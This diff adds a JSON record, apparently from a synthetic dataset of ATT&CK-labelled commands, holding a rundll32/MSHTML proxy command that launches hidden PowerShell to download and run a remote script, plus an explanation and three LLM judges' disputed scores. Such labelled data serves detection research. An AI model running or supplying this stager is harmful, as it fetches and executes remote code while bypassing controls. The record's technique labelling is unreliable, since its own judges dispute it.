@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe vbscript:\"\\..\\mshtml,RunHTMLApplication \";CreateObject(\"WScript.Shell\").Run \"powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.20/init.ps1')\"",
+  "explanation": "Leverages the VBScript entry into MSHTML via rundll32 to proxy into a hidden PowerShell stager. The proxy relies on trusted components, aiding control bypass.",
+  "rationale_steps": [
+    "From PowerShell, call rundll32 to run MSHTML via VBScript handler.",
+    "Use WScript.Shell to start a hidden PowerShell process that downloads and executes a remote script.",
+    "Abuses trusted binaries for proxy execution; defenders should flag VBScript/MSHTML exports paired with network pulls."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-69dd0d5d",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses with a known rundll32 mshtml VBScript invocation pattern and valid PowerShell flags make it parseable as written.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly proxies execution to a hidden PowerShell stager via signed components, this aligns more with Signed Binary Proxy Execution (rundll32/mshtml) than T1216 System Script Proxy Execution using trusted system scripts.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T21:09:31.189648Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command uses a known rundll32/VBScript/MSHTML trick with generally correct structure, but the quoting is complex and potentially fragile\u2014the nested quotes and semicolons within the VBScript string may not parse correctly in all shell contexts, and the backslash-dot path construct '\\..\\mshtml' is unconventional.",
+        "semantic_score": 4,
+        "semantic_justification": "The technique of using rundll32 with the VBScript-into-MSHTML trick to proxy execution is a well-documented living-off-the-land method that aligns with T1216's spirit of abusing trusted system components, and chaining it to a hidden PowerShell IEX downloader is operationally plausible, though T1216 specifically focuses on signed VBS scripts like PubPrn.vbs rather than this rundll32/mshtml variant (which maps more precisely to T1218.011).",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2026-02-19T00:03:10.270320Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 2,
+        "syntactic_justification": "The command fails because the shell (cmd or powershell) will split the VBScript/PowerShell string into multiple arguments for rundll32.exe due to the spaces and lack of outer quoting, preventing the protocol handler from receiving the full payload.",
+        "semantic_score": 2,
+        "semantic_justification": "The command is misaligned with MITRE ATT&CK Technique T1216, which focuses on abusing script files (like .vbs or .js); this command actually utilizes T1218.011 (Signed Binary Proxy Execution: Rundll32).",
+        "combined_score": 2.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:03:28.691044Z"
+      }
+    ],
+    "llm_average_syntactic": 3.333,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
